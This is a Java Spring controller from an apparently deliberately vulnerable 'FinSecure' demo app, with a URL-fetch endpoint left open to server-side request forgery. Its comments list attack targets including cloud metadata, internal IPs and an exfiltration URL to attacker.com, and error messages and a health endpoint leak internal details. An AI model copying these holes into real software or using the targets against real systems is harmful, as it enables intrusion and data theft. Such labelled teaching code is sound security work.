package com.finsecure.controller;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.HttpURLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.stream.Collectors;

/**
 * Utility Controller
 *
 * ============================================================
 * INTENTIONAL VULNERABILITIES (for security assessment demo):
 * ============================================================
 *
 * VULN: Server-Side Request Forgery (SSRF)
 *   Endpoint: GET /api/fetch?url=<any-url>
 *
 *   The application fetches the URL provided by the user and returns
 *   its response. An attacker can use this to:
 *     1. Access internal services: http://localhost:8080/actuator
 *     2. Read AWS/cloud metadata: http://169.254.169.254/latest/meta-data/
 *     3. Probe internal network: http://10.0.0.1, http://192.168.1.1
 *     4. Exfiltrate data via DNS: http://attacker.com/?data=secret
 *
 *   There is NO allowlist, NO blocked IP range check, NO SSRF protection.
 *
 *   CWE-918: Server-Side Request Forgery | CVSS: 7.2 High
 *
 *   Secure fix:
 *     - Validate URL against an allowlist of trusted domains
 *     - Block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x, 127.x)
 *     - Use a dedicated HTTP client with timeouts and proxy
 */
@RestController
@RequestMapping("/api")
public class UtilController {

    @GetMapping("/fetch")
    public ResponseEntity<Map<String, Object>> fetchUrl(
            @RequestParam String url) {

        Map<String, Object> response = new HashMap<>();

        try {
            // VULN: No URL validation — any URL accepted including internal/cloud metadata
            URL targetUrl = new URL(url);
            HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);

            int statusCode = connection.getResponseCode();

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream())
            );
            String body = reader.lines().collect(Collectors.joining("\n"));
            reader.close();

            response.put("url", url);           // reflects input back
            response.put("status", statusCode);
            response.put("body", body);         // returns full response body to attacker
            response.put("headers", connection.getHeaderFields());

            return ResponseEntity.ok(response);

        } catch (Exception e) {
            // VULN: Error message leaks internal info (connection refused, host not found, etc.)
            response.put("url", url);
            response.put("error", e.getMessage()); // e.g., "Connection refused to localhost:6379"
            response.put("errorType", e.getClass().getName());
            return ResponseEntity.status(500).body(response);
        }
    }

    // ─────────────────────────────────────────────────────────
    // Health check endpoint — public
    // ─────────────────────────────────────────────────────────
    @GetMapping("/health")
    public ResponseEntity<Map<String, String>> health() {
        return ResponseEntity.ok(Map.of(
                "status", "UP",
                "service", "FinSecure API",
                "version", "1.0.0",
                // VULN: Exposing environment/version info aids attacker reconnaissance
                "java", System.getProperty("java.version"),
                "os", System.getProperty("os.name")
        ));
    }
}
